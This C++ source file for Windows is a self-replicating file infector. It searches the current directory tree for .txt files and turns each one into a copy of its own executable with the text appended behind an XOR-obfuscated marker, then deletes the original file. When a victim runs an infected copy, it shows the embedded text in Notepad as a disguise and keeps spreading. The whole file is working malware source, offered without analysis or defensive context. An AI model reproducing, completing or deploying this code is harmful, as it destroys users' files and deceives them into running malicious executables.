#include <Windows.h>
#include <Psapi.h>
#include <cstdio>
#include <vector>
#include <string>
#include <atlpath.h>
#include <sstream>
#include <regex>


using namespace std;

void FindFiles(
	const CString& strRootPath,
	const CString& strExt,
	std::vector<CString>& listFiles,
	bool bRecursive = true)
{
	CString strFileToFind = strRootPath;
	ATLPath::Append(CStrBuf(strFileToFind, MAX_PATH), _T("*.*"));

	WIN32_FIND_DATA findData = { 0 };
	HANDLE hFileFind = FindFirstFile(strFileToFind, &findData);
	if (INVALID_HANDLE_VALUE != hFileFind)
	{
		do
		{
			CString strFileName = findData.cFileName;
			if ((strFileName == _T(".")) || (strFileName == _T("..")))
				continue;

			CString strFilePath = strRootPath;
			ATLPath::Append(CStrBuf(strFilePath, MAX_PATH), strFileName);
			if (bRecursive && (ATLPath::IsDirectory(strFilePath)))
			{
				FindFiles(strFilePath, strExt, listFiles);
			}
			else
			{
				CString strFoundExt = ATLPath::FindExtension(strFilePath);
				if (!strExt.CompareNoCase(strFoundExt))
					listFiles.push_back(strFilePath);
			}

		} while (FindNextFile(hFileFind, &findData));

		FindClose(hFileFind);
	}
}
	
class SigScan
{
public:
	DWORD FindPattern(byte* moduleBase, DWORD moduleSize, const char* pattern, const char* mask)
	{
		DWORD base = reinterpret_cast<DWORD>(moduleBase);
		DWORD patternLength = static_cast<DWORD>(strlen(mask));

		for (DWORD i = 0; i < moduleSize - patternLength; i++)
		{
			bool found = true;
			for (DWORD j = 0; j < patternLength; j++)
			{
				found &= mask[j] == '?' || pattern[j] == *(char*)(base + i + j);
			}
			if (found)
			{
				return base + i;
			}
		}

		return 0;
	}
};

std::vector<std::string> split(const std::string& s, char delim) {
	std::stringstream ss(s);
	std::string item;
	std::vector<std::string> elems;
	while (std::getline(ss, item, delim)) {
		elems.push_back(item);
	}
	return elems;
}

#define CRYPT_KEY 0x13

unsigned char MAGIC_PATTERN[] = {
	0x01 ^ CRYPT_KEY,
	0x03 ^ CRYPT_KEY,
	0x03 ^ CRYPT_KEY,
	0x07 ^ CRYPT_KEY,
	0x0F ^ CRYPT_KEY,
	0x0A ^ CRYPT_KEY,
	0x0B ^ CRYPT_KEY,
	0x0C ^ CRYPT_KEY
};

INT __stdcall WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	//Decrypt pattern
	for(int i = 0; i < 8; i++)
		MAGIC_PATTERN[i] ^= CRYPT_KEY;
	
	CHAR myName[MAX_PATH] = { 0 };
	CHAR tmpFileName[MAX_PATH] = { 0 };
	CHAR tmpPath[MAX_PATH] = { 0 };
	CHAR currentDir[MAX_PATH] = { 0 };
	GetTempPath(MAX_PATH, tmpPath);
	GetTempFileName(tmpPath, nullptr, 0, tmpFileName);
	GetCurrentDirectory(MAX_PATH, currentDir);
	DWORD modNameSize = GetModuleFileName(NULL, myName, MAX_PATH);

	if(modNameSize == 0)
		return -1;

	FILE* self_exe = nullptr;
	fopen_s(&self_exe, myName, "rb");
	if(self_exe == nullptr)
		return 0;
	fseek(self_exe, 0, SEEK_END);
	DWORD fSize = ftell(self_exe);
	fseek(self_exe, 0, 0);
	byte* myExe = new byte[fSize];
	fread_s(myExe, fSize, 1, fSize, self_exe);
	fclose(self_exe);

	SigScan scanner;

	//Find magic pattern
	const DWORD result = scanner.FindPattern(myExe, fSize, reinterpret_cast<const char*>(MAGIC_PATTERN), "xxxxxxxx");
	if(result != 0)
	{
		PDWORD pMagicPoint = reinterpret_cast<PDWORD>(result + 8);
		DWORD txtSize = *pMagicPoint;
		if(txtSize != 0)
		{
			pMagicPoint++;
			char* txt = new char[txtSize];
			for (DWORD i = reinterpret_cast<DWORD>(pMagicPoint); i < reinterpret_cast<DWORD>(pMagicPoint) + txtSize; i++)
				txt[i - reinterpret_cast<DWORD>(pMagicPoint)] = *reinterpret_cast<char*>(i);

			FILE* txtFile = nullptr;
			fopen_s(&txtFile, tmpFileName, "wb");
			fwrite(txt, 1, txtSize, txtFile);
			fclose(txtFile);
			delete[] txt;
			fSize = result - reinterpret_cast<DWORD>(myExe);
			ShellExecute(nullptr,
				"open",
				"notepad.exe",
				tmpFileName,
				nullptr,
				SW_SHOW);
			Sleep(666);
			DeleteFile(tmpFileName);
		}
		else
		{
			ShellExecute(nullptr,
				"open",
				"notepad.exe",
				nullptr,
				nullptr,
				SW_SHOW);
		}
	}
	
	std::vector<CString> listFiles;
	FindFiles(_T(currentDir), _T(".txt"), listFiles);

	for(size_t i = 0; i < listFiles.size(); i++)
	{
		FILE* txt2virus = nullptr;
		fopen_s(&txt2virus, listFiles[i], "rb");

		if(txt2virus == nullptr)
			continue;
		
		fseek(txt2virus, 0, SEEK_END);
		
		DWORD txtSize = ftell(txt2virus);
		char* txtBuf = new char[txtSize];
		ZeroMemory(txtBuf, txtSize);
		
		fseek(txt2virus, 0, 0);
		fread_s(txtBuf, txtSize, 1, txtSize, txt2virus);
		fclose(txt2virus);


		DWORD infSize = fSize + 8 + 4 + txtSize;
		byte* virusExe = new byte[infSize];
		ZeroMemory(virusExe, infSize);
		unsigned long long ptrn = (*reinterpret_cast<unsigned long long*>(MAGIC_PATTERN));
		memcpy(virusExe, myExe, fSize);
		memcpy(reinterpret_cast<void*>(reinterpret_cast<DWORD>(virusExe) + fSize), &ptrn, 8);// copy magic pattern
		memcpy(reinterpret_cast<void*>(reinterpret_cast<DWORD>(virusExe) + fSize + 8), &txtSize, 4);//copy file size
		memcpy(reinterpret_cast<void*>(reinterpret_cast<DWORD>(virusExe) + fSize + 8 + 4), txtBuf, txtSize);//copy txt
		

		FILE* saveExe = nullptr;

		vector<string> splitter = split(string(listFiles[i]), '\\');
		vector<string> without_ext = split(splitter[splitter.size() - 1], '.');
		fopen_s(&saveExe, (without_ext[0] + ".exe").c_str(), "wb");

		if(saveExe == nullptr)
			continue;

		fwrite(virusExe, 1, infSize, saveExe);
		DeleteFile(listFiles[i]);
		fclose(saveExe);

		delete[] virusExe;
		
	}
	return 0;
}
